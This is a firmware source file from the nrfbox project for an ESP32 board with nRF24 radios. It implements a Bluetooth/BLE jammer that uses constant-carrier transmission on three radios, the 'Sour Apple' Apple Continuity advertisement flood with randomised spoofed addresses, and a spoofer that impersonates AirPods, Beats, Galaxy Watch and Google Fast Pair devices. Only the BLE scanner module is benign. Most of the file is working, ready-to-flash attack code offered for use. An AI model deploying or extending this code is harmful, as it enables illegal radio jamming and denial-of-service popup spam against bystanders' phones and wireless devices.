/* ____________________________
   This software is licensed under the MIT License:
   https://github.com/cifertech/nrfbox
   ________________________________________ */

#include "config.h"
#include "icon.h"

namespace BleJammer {

  enum OperationMode { DEACTIVE_MODE, BLE_MODULE, Bluetooth_MODULE };
  OperationMode currentMode = DEACTIVE_MODE;

  const byte bluetooth_channels[] = {32, 34, 46, 48, 50, 52, 0, 1, 2, 4, 6, 8, 22, 24, 26, 28, 30, 74, 76, 78, 80};
  const byte ble_channels[] = {2, 26, 80};

  const byte BLE_channels[] = {2, 26, 80}; 
  byte channelGroup1[] = {2, 5, 8, 11};    
  byte channelGroup2[] = {26, 29, 32, 35}; 
  byte channelGroup3[] = {80, 83, 86, 89}; 

  volatile bool modeChangeRequested = false;

  unsigned long lastJammingTime = 0;
  const unsigned long jammingInterval = 10;

  unsigned long lastButtonPressTime = 0;
  const unsigned long debounceDelay = 500;

  void IRAM_ATTR handleButtonPress() {
    unsigned long currentTime = millis();
    if (currentTime - lastButtonPressTime > debounceDelay) {
      modeChangeRequested = true;
      lastButtonPressTime = currentTime;
    }
  }

  void configureRadio(RF24 &radio, const byte* channels, size_t size) {
    configureNrf(radio); 
    radio.printPrettyDetails(); 
    for (size_t i = 0; i < size; i++) {
      radio.setChannel(channels[i]);
      radio.startConstCarrier(RF24_PA_MAX, channels[i]);
    }
  }

  void initializeRadiosMultiMode() {
    if (RadioA.begin()) {
      configureRadio(RadioA, channelGroup1, sizeof(channelGroup1));
    }
    if (RadioB.begin()) {
      configureRadio(RadioB, channelGroup2, sizeof(channelGroup2));
    }
    if (RadioC.begin()) {
      configureRadio(RadioC, channelGroup3, sizeof(channelGroup3));
    }
  }

  void initializeRadios() {
    if (currentMode != DEACTIVE_MODE) { 
      initializeRadiosMultiMode();
    } else if (currentMode == DEACTIVE_MODE) {
      RadioA.powerDown();
      RadioB.powerDown();
      RadioC.powerDown();
      delay(100);
    } 
  }

  void jammer(RF24 &radio, const byte* channels, size_t size) {
    const char text[] = "xxxxxxxxxxxxxxxx";
    for (size_t i = 0; i < size; i++) {
      radio.setChannel(channels[i]);
      radio.write(&text, sizeof(text));
      //delayMicroseconds(20);
    }
  }

  void updateOLED() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);

    u8g2.setCursor(0, 10);
    u8g2.print("Mode:");
    u8g2.setCursor(60, 10);
    u8g2.print("[");
    u8g2.print(currentMode == BLE_MODULE ? "BLE" : currentMode == Bluetooth_MODULE ? "Bluetooth" : "Deactive");
    u8g2.print("]");

    u8g2.setCursor(0, 35);
    u8g2.print("Radio 1: ");
    u8g2.setCursor(70, 35);
    u8g2.print(RadioA.isChipConnected() ? "Active" : "Inactive");

    u8g2.setCursor(0, 50);
    u8g2.print("Radio 2: ");
    u8g2.setCursor(70, 50);
    u8g2.print(RadioB.isChipConnected() ? "Active" : "Inactive");

    u8g2.setCursor(0, 64);
    u8g2.print("Radio 3: ");
    u8g2.setCursor(70, 64);
    u8g2.print(RadioC.isChipConnected() ? "Active" : "Inactive");

    u8g2.sendBuffer();
  }

  void checkModeChange() {
    if (modeChangeRequested) {
      modeChangeRequested = false;
      currentMode = static_cast<OperationMode>((currentMode + 1) % 3);
      initializeRadios();
      updateOLED();
    }
  }

  void blejammerSetup() {
    Serial.begin(115200);

    esp_bt_controller_deinit();
    esp_wifi_stop();
    esp_wifi_deinit();
    esp_wifi_disconnect();

    pinMode(BUTTON_UP_PIN, INPUT_PULLUP);
    attachInterrupt(digitalPinToInterrupt(BUTTON_UP_PIN), handleButtonPress, FALLING);

    initializeRadios();
    updateOLED();
  }

  void blejammerLoop() {
    checkModeChange();

    if (currentMode == BLE_MODULE) {
      int randomIndex = random(0, sizeof(ble_channels) / sizeof(ble_channels[0]));
      byte channel = ble_channels[randomIndex]; 
      RadioA.setChannel(channel);
      RadioB.setChannel(channel);
      RadioC.setChannel(channel);
    } else if (currentMode == Bluetooth_MODULE) {
      int randomIndex = random(0, sizeof(bluetooth_channels) / sizeof(bluetooth_channels[0]));
      byte channel = bluetooth_channels[randomIndex]; 
      RadioA.setChannel(channel);
      RadioB.setChannel(channel);
      RadioC.setChannel(channel);
    }
  }
}



namespace BleScan {

BLEScan* scan;
BLEScanResults results;

int selectedIndex = 0;
int displayStartIndex = 0;
bool showDetails = false;
unsigned long scanStartTime = 0;
const unsigned long scanDuration = 5000;
bool scanComplete = false;

unsigned long lastDebounce = 0;
unsigned long debounce_Delay = 200;

void blescanSetup() {
  Serial.begin(115200);
  u8g2.setFont(u8g2_font_6x10_tr);
  
  BLEDevice::init("");
  scan = BLEDevice::getScan();
  scan->setActiveScan(true);
  
  pinMode(BUTTON_UP_PIN, INPUT_PULLUP);
  pinMode(BUTTON_DOWN_PIN, INPUT_PULLUP);
  pinMode(BTN_PIN_RIGHT, INPUT_PULLUP);
  pinMode(BTN_PIN_LEFT, INPUT_PULLUP);

  
  for (int cycle = 0; cycle < 3; cycle++) { 
    for (int i = 0; i < 3; i++) {
      u8g2.clearBuffer();
      u8g2.setFont(u8g2_font_6x10_tr);
      u8g2.drawStr(0, 10, "Scanning BLE");

      String dots = "";
      for (int j = 0; j <= i; j++) {
        dots += ".";
        setNeoPixelColour("white");
      }
      setNeoPixelColour("0");
      
      u8g2.drawStr(75, 10, dots.c_str()); 

      u8g2.sendBuffer();
      delay(300); 
    }
  }

  scanStartTime = millis();
  scan->start(scanDuration / 1000, false);
}

void blescanLoop() {
  unsigned long currentMillis = millis();
  if (currentMillis - scanStartTime >= scanDuration && !scanComplete) {
    scanComplete = true;
    results = scan->getResults();
    scan->stop();
    u8g2.clearBuffer();
    u8g2.drawStr(0, 10, "Scan complete.");
    u8g2.sendBuffer();
  }

  if (currentMillis - lastDebounce > debounce_Delay) {
    if (digitalRead(BUTTON_UP_PIN) == LOW) {
      if (selectedIndex > 0) {
        selectedIndex--;
        if (selectedIndex < displayStartIndex) {
          displayStartIndex--;
        }
      }
      lastDebounce = currentMillis;
    } else if (digitalRead(BUTTON_DOWN_PIN) == LOW) {
      if (selectedIndex < results.getCount() - 1) {
        selectedIndex++;
        if (selectedIndex >= displayStartIndex + 5) {
          displayStartIndex++;
        }
      }
      lastDebounce = currentMillis;
    } else if (digitalRead(BTN_PIN_RIGHT) == LOW) {
      showDetails = true;
      lastDebounce = currentMillis;
    }
  }

  if (!showDetails && scanComplete) {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 10, "BLE Devices:");

    int deviceCount = results.getCount();
    for (int i = 0; i < 5; i++) {
      int deviceIndex = i + displayStartIndex;
      if (deviceIndex >= deviceCount) break;
      BLEAdvertisedDevice device = results.getDevice(deviceIndex);
      String deviceName = device.getName().c_str();
      u8g2.setFont(u8g2_font_6x10_tr);
      if (deviceName.length() == 0) {
        deviceName = "No Name";
      }
      String deviceInfo = deviceName.substring(0, 7) + " | RSSI " + String(device.getRSSI());
      if (deviceIndex == selectedIndex) {
        u8g2.drawStr(0, 23 + i * 10, ">");
      }
      u8g2.drawStr(10, 23 + i * 10, deviceInfo.c_str());
    }
    u8g2.sendBuffer();
  }

  if (showDetails) {
    BLEAdvertisedDevice device = results.getDevice(selectedIndex);
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(0, 10, "Device Details:");
    u8g2.setFont(u8g2_font_5x8_tr);
    String name = "Name: " + String(device.getName().c_str());
    String address = "Addr: " + String(device.getAddress().toString().c_str());
    String rssi = "RSSI: " + String(device.getRSSI());
    u8g2.drawStr(0, 20, name.c_str());
    u8g2.drawStr(0, 30, address.c_str());
    u8g2.drawStr(0, 40, rssi.c_str());
    u8g2.drawStr(0, 50, "Press LEFT to go back");
    u8g2.sendBuffer();

    if (digitalRead(BTN_PIN_LEFT) == LOW) {
      showDetails = false;
      lastDebounce = currentMillis;
      }
    }  
  }  
}


namespace SourApple {

std::string device_uuid = "00003082-0000-1000-9000-00805f9b34fb";

BLEAdvertising *Advertising;
uint8_t packet[17];

#define MAX_LINES 8
String lines[MAX_LINES];
int currentLine = 0;
int lineNumber = 1;

uint32_t delayMilliseconds = 1000;

void updatedisplay() {
  u8g2.clearBuffer();

  for (int i = 0; i < MAX_LINES; i++) {
    u8g2.setCursor(0, (i + 1) * 12);
    u8g2.print(lines[i]);
  }

  u8g2.sendBuffer();
  Advertising->stop();
}

void addLineToDisplay(String newLine) {
  for (int i = 0; i < MAX_LINES - 1; i++) {
    lines[i] = lines[i + 1];
  }
  lines[MAX_LINES - 1] = newLine;

  updatedisplay();
}

void displayAdvertisementData() {
  String lineStr = String(lineNumber) + ": ";
  lineNumber++;
  // Convert the advertisement data to a readable string format
  //String dataStr = "Type: 0x";
  String dataStr = "0x";
  dataStr += String(packet[1], HEX);
  //dataStr += ", CompID: 0x";
  dataStr += ",0x";
  dataStr += String(packet[2], HEX);
  dataStr += String(packet[3], HEX);
  //dataStr += ", ActType: 0x";
  dataStr += ",0x";
  dataStr += String(packet[7], HEX);

  addLineToDisplay(lineStr + dataStr);

}

BLEAdvertisementData getOAdvertisementData() {
  BLEAdvertisementData advertisementData = BLEAdvertisementData();
  uint8_t i = 0;

  packet[i++] = 17 - 1;    // Packet Length
  packet[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
  packet[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
  packet[i++] = 0x00;        // ...
  packet[i++] = 0x0F;  // Type
  packet[i++] = 0x05;                        // Length
  packet[i++] = 0xC1;                        // Action Flags
  const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
  packet[i++] = types[rand() % sizeof(types)];  // Action Type
  esp_fill_random(&packet[i], 3); // Authentication Tag
  i += 3;
  packet[i++] = 0x00;  // ???
  packet[i++] = 0x00;  // ???
  packet[i++] =  0x10;  // Type ???
  esp_fill_random(&packet[i], 3);

  advertisementData.addData(std::string((char *)packet, 17));
  return advertisementData;
}

void sourappleSetup() {
  
  u8g2.setFont(u8g2_font_profont11_tf); 

  BLEDevice::init("");
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9); 
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9); 
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN , ESP_PWR_LVL_P9);

  BLEServer *pServer = BLEDevice::createServer();
  Advertising = pServer->getAdvertising();

  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  Advertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
}

void sourappleLoop() {

    esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    for (int i = 0; i < 6; i++) {
      dummy_addr[i] = random(256);
      if (i == 0) {
        dummy_addr[i] |= 0xF0;
      }
    }
    BLEAdvertisementData oAdvertisementData = getOAdvertisementData();

    Advertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
    Advertising->addServiceUUID(device_uuid);
    Advertising->setAdvertisementData(oAdvertisementData);

    Advertising->setMinInterval(0x20);
    Advertising->setMaxInterval(0x20);
    Advertising->setMinPreferred(0x20);
    Advertising->setMaxPreferred(0x20);

    Advertising->start();

    delay(40);
    displayAdvertisementData(); 
  } 
}


namespace Spoofer {

  BLEAdvertising *pAdvertising;
  std::string devices_uuid = "00003082-0000-1000-9000-00805f9b34fb";

  int menuIndex = 0;
  const char* menuItems[] = {"Device:", "Adv Type:", "Advertising:"};
  const int menuSize = 3;

  const char* deviceNames[] = {
    "Airpods", "Airpods Pro", "Airpods Max", "Airpods Gen 2", "Airpods Gen 3",
    "Airpods Pro Gen 2", "PowerBeats", "PowerBeats Pro", "Beats Solo Pro",
    "Beats Studio Buds", "Beats Flex", "Beats X", "Beats Solo 3",
    "Beats Studio 3", "Beats Studio Pro", "Beats Fit Pro", "Beats Studio Buds+",
    "Galaxy Watch 4", "Galaxy Watch 5", "Galaxy Watch 6", "Google Smart Ctrl" 
  };
  const int deviceCount = 21; 

  const char* advTypes[] = {"IND", "D-HIGH", "SCAN", "NONCONN", "D-LOW"};
  const int advTypeCount = 5;

  unsigned long lastDebounceTimeUp = 0;
  unsigned long lastDebounceTimeDown = 0;
  unsigned long lastDebounceTimeRight = 0;
  unsigned long lastDebounceTimeLeft = 0;
  unsigned long debounceDelay = 200;

  uint32_t delayMillisecond = 1000;
  bool isAdvertising = false;
  int deviceType = 1; 
  int advType = 1;    
  int device_index = 0; 

  // Apple devices (31-byte packets)
  const uint8_t DEVICES[][31] = {
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
  };

  // Samsung devices (15 bytes)
  struct WatchModel {
    uint8_t value;
    const char* name;
  };
  const WatchModel samsungModels[] = {
    {0x01, "Galaxy Watch 4"},
    {0x02, "Galaxy Watch 5"},
    {0x03, "Galaxy Watch 6"}
  };
  const uint8_t samsungModelCount = 3;
  const uint8_t SAMSUNG_ADV_SIZE = 15;
  const uint16_t SAMSUNG_COMPANY_ID = 0x0075;
  const uint8_t SAMSUNG_ADV_TEMPLATE[SAMSUNG_ADV_SIZE] = {
    14, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, 0x00
  };

  // Google device (14 bytes, single model)
  const uint8_t GOOGLE_ADV_SIZE = 14;
  const uint16_t GOOGLE_FAST_PAIR_ID = 0xFE2C;
  const uint8_t GOOGLE_ADV_TEMPLATE[GOOGLE_ADV_SIZE] = {
    0x03, 0x03, 0x2C, 0xFE, // Complete 16-bit Service UUIDs
    0x06, 0x16, 0x2C, 0xFE, 0x00, 0xB7, 0x27, // Service Data
    0x02, 0x0A, 0x00 // TX Power (placeholder, set dynamically)
  };

  bool generateSamsungAdvPacket(uint8_t modelIndex, BLEAdvertisementData& advData) {
    if (modelIndex >= samsungModelCount) return false;
    uint8_t advDataRaw[SAMSUNG_ADV_SIZE];
    memcpy(advDataRaw, SAMSUNG_ADV_TEMPLATE, SAMSUNG_ADV_SIZE);
    advDataRaw[SAMSUNG_ADV_SIZE - 1] = samsungModels[modelIndex].value;
    advData.addData(std::string((char*)advDataRaw, SAMSUNG_ADV_SIZE));
    return true;
  }

  bool generateGoogleAdvPacket(BLEAdvertisementData& advData) {
    uint8_t advDataRaw[GOOGLE_ADV_SIZE];
    memcpy(advDataRaw, GOOGLE_ADV_TEMPLATE, GOOGLE_ADV_SIZE);
    advDataRaw[GOOGLE_ADV_SIZE - 1] = (uint8_t)(random(121) - 100); 
    advData.addData(std::string((char*)advDataRaw, GOOGLE_ADV_SIZE));
    return true;
  }

  BLEAdvertisementData getAdvertisementData() {
    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
    if (deviceType <= 17) { // Apple (1–17)
      oAdvertisementData.addData(std::string((char*)DEVICES[device_index], 31));
    } else if (deviceType <= 20) { // Samsung (18–20)
      uint8_t samsungIndex = deviceType - 18; // 18→0, 19→1, 20→2
      generateSamsungAdvPacket(samsungIndex, oAdvertisementData);
    } else { // Google (21)
      generateGoogleAdvPacket(oAdvertisementData);
    }
    switch (advType) {
      case 1: pAdvertising->setAdvertisementType(ADV_TYPE_IND); break;
      case 2: pAdvertising->setAdvertisementType(ADV_TYPE_DIRECT_IND_HIGH); break;
      case 3: pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND); break;
      case 4: pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND); break;
      case 5: pAdvertising->setAdvertisementType(ADV_TYPE_DIRECT_IND_LOW); break;
    }
    return oAdvertisementData;
  }

  void updateDisplay() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_profont11_tf);
    int xshift = 4;
    for (int i = 0; i < menuSize; i++) {
      int y = (i == 0) ? 14 : (i == 1) ? 43 : 57;
      if (menuIndex == i) {
        u8g2.setFont(u8g2_font_5x7_tf);
        u8g2.drawStr(0 + xshift, y, ">");
        u8g2.setFont(u8g2_font_profont11_tf);
        u8g2.drawStr(8 + xshift, y, menuItems[i]);
      } else {
        u8g2.setFont(u8g2_font_5x7_tf);
        u8g2.drawStr(8 + xshift, y, menuItems[i]);
      }
      u8g2.setFont(u8g2_font_5x7_tf);
      if (i == 0) {
        String deviceText = String("[ ") + String(deviceNames[deviceType - 1]) + String(" ]");
        if (deviceText.length() > 25) deviceText = deviceText.substring(0, 15) + "...";
        u8g2.drawStr(5 + xshift, 26, deviceText.c_str());
      } else if (i == 1) {
        u8g2.drawStr(81 + xshift, 43, advTypes[advType - 1]);
      } else {
        u8g2.setCursor(81 + xshift, 57);
        u8g2.print(isAdvertising ? "Active" : "Disable");
      }
    }
    u8g2.drawHLine(0, 0, 4); u8g2.drawVLine(0, 0, 4);
    u8g2.drawHLine(124, 0, 4); u8g2.drawVLine(127, 0, 4);
    u8g2.drawHLine(0, 63, 4); u8g2.drawVLine(0, 60, 4);
    u8g2.drawHLine(124, 63, 4); u8g2.drawVLine(127, 60, 4);
    u8g2.sendBuffer();
  }

  void Airpods() { device_index = 0; }
  void Airpods_pro() { device_index = 1; }
  void Airpods_Max() { device_index = 2; }
  void Airpods_Gen_2() { device_index = 3; }
  void Airpods_Gen_3() { device_index = 4; }
  void Airpods_Pro_Gen_2() { device_index = 5; }
  void Power_Beats() { device_index = 6; }
  void Power_Beats_Pro() { device_index = 7; }
  void Beats_Solo_Pro() { device_index = 8; }
  void Beats_Studio_Buds() { device_index = 9; }
  void Beats_Flex() { device_index = 10; }
  void Beats_X() { device_index = 11; }
  void Beats_Solo_3() { device_index = 12; }
  void Beats_Studio_3() { device_index = 13; }
  void Beats_Studio_Pro() { device_index = 14; }
  void Beats_Fit_Pro() { device_index = 15; }
  void Beats_Studio_Buds_Plus() { device_index = 16; }
  void Galaxy_Watch_4() { device_index = 0; }
  void Galaxy_Watch_5() { device_index = 1; }
  void Galaxy_Watch_6() { device_index = 2; }
  void Google_Smart_Ctrl() { device_index = 0; } 

  void setAdvertisingData() {
    switch (deviceType) {
      case 1: Airpods(); break;
      case 2: Airpods_pro(); break;
      case 3: Airpods_Max(); break;
      case 4: Airpods_Gen_2(); break;
      case 5: Airpods_Gen_3(); break;
      case 6: Airpods_Pro_Gen_2(); break;
      case 7: Power_Beats(); break;
      case 8: Power_Beats_Pro(); break;
      case 9: Beats_Solo_Pro(); break;
      case 10: Beats_Studio_Buds(); break;
      case 11: Beats_Flex(); break;
      case 12: Beats_X(); break;
      case 13: Beats_Solo_3(); break;
      case 14: Beats_Studio_3(); break;
      case 15: Beats_Studio_Pro(); break;
      case 16: Beats_Fit_Pro(); break;
      case 17: Beats_Studio_Buds_Plus(); break;
      case 18: Galaxy_Watch_4(); break;
      case 19: Galaxy_Watch_5(); break;
      case 20: Galaxy_Watch_6(); break;
      case 21: Google_Smart_Ctrl(); break;
      default: Airpods(); break;
    }
  }

  void toggleAdvertising() {
    isAdvertising = !isAdvertising;

    if (!isAdvertising) {
      pAdvertising->stop();
      Serial.println("Advertising stopped.");
    } else {
      esp_bd_addr_t dummy_addr = {0x00};
      for (int i = 0; i < 6; i++) {
        dummy_addr[i] = random(256);
        if (i == 0) dummy_addr[i] |= 0xC0; // Random non-resolvable
      }
      BLEAdvertisementData oAdvertisementData = getAdvertisementData();
      pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
      pAdvertising->addServiceUUID(devices_uuid);
      pAdvertising->setAdvertisementData(oAdvertisementData);
      pAdvertising->setMinInterval(0x20); // 32.5ms
      pAdvertising->setMaxInterval(0x20);
      pAdvertising->setMinPreferred(0x20);
      pAdvertising->setMaxPreferred(0x20);
      pAdvertising->start();
      Serial.println("Advertising started.");
    }
    updateDisplay();
  }

  void changeDeviceTypeNext() {
    deviceType = (deviceType % deviceCount) + 1;
    Serial.println("Device Type: " + String(deviceNames[deviceType - 1]));
    setAdvertisingData();
    updateDisplay();
  }

  void changeDeviceTypePrev() {
    deviceType = (deviceType - 2 + deviceCount) % deviceCount + 1;
    Serial.println("Device Type: " + String(deviceNames[deviceType - 1]));
    setAdvertisingData();
    updateDisplay();
  }

  void changeAdvTypeNext() {
    advType = (advType % advTypeCount) + 1;
    Serial.println("Adv Type: " + String(advTypes[advType - 1]));
    updateDisplay();
  }

  void changeAdvTypePrev() {
    advType = (advType - 2 + advTypeCount) % advTypeCount + 1;
    Serial.println("Adv Type: " + String(advTypes[advType - 1]));
    updateDisplay();
  }

  void navigateUp() {
    menuIndex = (menuIndex - 1 + menuSize) % menuSize;
    Serial.println("Navigate Up: menuIndex=" + String(menuIndex));
    updateDisplay();
  }

  void navigateDown() {
    menuIndex = (menuIndex + 1) % menuSize;
    Serial.println("Navigate Down: menuIndex=" + String(menuIndex));
    updateDisplay();
  }

  void changeOptionRight() {
    if (menuIndex == 0) changeDeviceTypeNext();
    else if (menuIndex == 1) changeAdvTypeNext();
    else toggleAdvertising();
  }

  void changeOptionLeft() {
    if (menuIndex == 0) changeDeviceTypePrev();
    else if (menuIndex == 1) changeAdvTypePrev();
    else toggleAdvertising();
  }

  void handleButtonPress(int pin, unsigned long &lastDebounceTime, void (*callback)()) {
    if (digitalRead(pin) == LOW) {
      unsigned long currentTime = millis();
      if ((currentTime - lastDebounceTime) > debounceDelay) {
        Serial.println("Button press: Pin=" + String(pin));
        callback();
        lastDebounceTime = currentTime;
      }
    }
  }

  void spooferSetup() {
    Serial.begin(115200);
    
    randomSeed(analogRead(0));
    pinMode(BUTTON_UP_PIN, INPUT_PULLUP);
    pinMode(BUTTON_DOWN_PIN, INPUT_PULLUP);
    pinMode(BTN_PIN_RIGHT, INPUT_PULLUP);
    pinMode(BTN_PIN_LEFT, INPUT_PULLUP);

    BLEDevice::init("nRF-BOX");
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9); // +9dBm
    BLEServer *pServer = BLEDevice::createServer();
    pAdvertising = pServer->getAdvertising();
    esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
    pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);

    updateDisplay();

    setNeoPixelColour("null");
  }

  void spooferLoop() {
    handleButtonPress(BUTTON_UP_PIN, lastDebounceTimeUp, navigateUp);
    handleButtonPress(BUTTON_DOWN_PIN, lastDebounceTimeDown, navigateDown);
    handleButtonPress(BTN_PIN_RIGHT, lastDebounceTimeRight, changeOptionRight);
    handleButtonPress(BTN_PIN_LEFT, lastDebounceTimeLeft, changeOptionLeft);
    delay(50);

    const char* color = "0";
    
    if (isAdvertising) {
      if (deviceType <= 17) color = "red"; // Apple
      else if (deviceType <= 20) color = "purple"; // Samsung
      else color = "green"; // Google
    }
    else if (!isAdvertising){color = "null";}
    
    setNeoPixelColour(color);
  }
}
